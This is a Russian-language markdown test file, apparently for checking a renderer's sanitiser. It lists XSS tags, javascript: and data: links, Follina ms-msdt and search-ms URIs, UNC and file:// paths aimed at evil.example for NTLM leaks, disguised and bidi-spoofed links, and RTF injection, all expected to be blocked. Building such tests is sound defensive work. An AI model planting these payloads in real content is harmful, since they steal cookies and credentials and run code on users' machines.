# Проверка защиты (все ссылки ниже должны блокироваться)

Этот файл собирает типовые атаки через markdown. Ни одна не должна сработать.

## Скрипты и HTML

<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<iframe src="https://evil.example"></iframe>
<a href="javascript:alert(1)">HTML-ссылка с javascript</a>

## Опасные протоколы

- [javascript](javascript:alert(document.cookie))
- [JaVaScRiPt со сменой регистра](JaVaScRiPt:alert(1))
- [vbscript](vbscript:msgbox("x"))
- [data: HTML](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
- [Follina ms-msdt](ms-msdt:/id%20PCWDiagnostic%20/skip%20force)
- [search-ms](search-ms:query=invoice&crumb=location:\\evil.example\share)
- [ms-officecmd](ms-officecmd:eyJ0ZXN0IjoxfQ==)
- [ms-appinstaller](ms-appinstaller:?source=https://evil.example/x.appx)

## Сетевые пути (утечка NTLM)

- [UNC-ссылка](\\evil.example\share\doc.md)
- [file://](file://evil.example/share/doc.md)
- ![UNC-картинка — не должна грузиться](\\evil.example\share\pixel.png)
- ![file-картинка](file://evil.example/share/pixel.png)

## Исполняемые файлы

- [setup.exe](setup.exe)
- [run.bat](tools/run.bat)
- [ярлык](C:\Users\Public\Desktop\x.lnk)
- [PowerShell](script.ps1)

## Подмена адреса

- [https://bank.example.com](https://evil.example/login) — текст показывает один сайт, ведёт на другой
- [Вход](https://bank.example.com@evil.example/login) — трюк с «@»
- [Скрытые bidi-символы](https://example.com/‮gpj.exe)

## Локальная сеть

![роутер](http://192.168.0.1/reboot.png)
![localhost](http://localhost:8080/admin.png)

## Попытка RTF-инъекции

Текст {\rtf1 {\object\objemb {\*\objdata 0102}}} и \field{\*\fldinst HYPERLINK "http://x"}.

Символы Private Use Area: , , .

## Нормальные ссылки (должны работать)

- [Обычный сайт](https://example.com)
- [Назад к витрине](showcase.md)
- [Якорь](#скрипты-и-html)
